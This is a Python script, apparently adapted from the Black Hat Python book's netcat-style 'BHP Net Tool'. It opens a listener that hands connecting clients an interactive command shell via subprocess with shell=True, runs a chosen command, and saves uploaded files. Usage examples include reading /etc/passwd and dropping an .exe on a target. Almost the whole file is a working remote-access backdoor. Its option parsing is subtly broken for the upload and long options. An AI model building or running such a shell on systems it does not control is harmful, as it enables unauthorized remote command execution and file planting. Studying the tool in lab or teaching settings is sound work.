import sys
import socket
import getopt
import threading
import subprocess

# Variáveis globais
listen = False
command = False
upload = False
execute = ""
upload_destination = ""
target = ""
port = 0

# Sequências de cor ANSI
GREEN = "\033[32m"
RESET = "\033[0m"


def usage():
    print(f"{GREEN}@ BHP R0Z&ND0XX Net Tool @{RESET}")
    print(f"{GREEN}usage: bhpnet.py -t target_host -p port{RESET}")
    print(f"{GREEN}-l --listen              - listen on [host]:[port] for incoming connections{RESET}")
    print(f"{GREEN}-e --execute=file_to_run - execute the given file upon receiving a connection{RESET}")
    print(f"{GREEN}-c --command             - initialize a command shell{RESET}")
    print(
        f"{GREEN}-u --upload=destination  - upon receiving a connection upload a file and write to [destination]{RESET}")
    print(f"{GREEN}\nExamples:{RESET}")
    print(f"{GREEN} bhpnet.py -t 192.168.0.1 -p 5555 -l -c{RESET}")
    print(f"{GREEN} bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe{RESET}")
    print(f"{GREEN} bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"{RESET}")
    print(f"{GREEN}echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.0.1 -p 135{RESET}")
    sys.exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode())

        while True:
            response = ""
            while True:
                data = client.recv(4096)
                if len(data) == 0:
                    break
                response += data.decode()
                if len(data) < 4096:
                    break

            print(f"{GREEN}{response}{RESET}", end="")

            buffer = input("")  # Para Python 3, use input() em vez de raw_input()
            buffer += "\n"
            client.send(buffer.encode())
    except Exception as e:
        print(f"{GREEN}[*] Exception! Exiting: {e}{RESET}")
        client.close()


def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    command = command.strip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = b"Failed to execute command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = b""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file_buffer += data

        try:
            with open(upload_destination, "wb") as file:
                file.write(file_buffer)
            client_socket.send(f"{GREEN}Successfully saved file to {upload_destination}{RESET}\r\n".encode())
        except:
            client_socket.send(f"{GREEN}Failed to save file to {upload_destination}{RESET}\r\n".encode())

    if len(execute):
        output = run_command(execute)
        client_socket.send(f"{GREEN}{output.decode()}{RESET}".encode())


    if command:
        while True:
            client_socket.send(f"{GREEN}<BHP:#> {RESET}".encode())
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            response = run_command(cmd_buffer)
            client_socket.send(f"{GREEN}{response.decode()}{RESET}".encode())


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    if listen:
        server_loop()


if __name__ == "__main__":
    main()
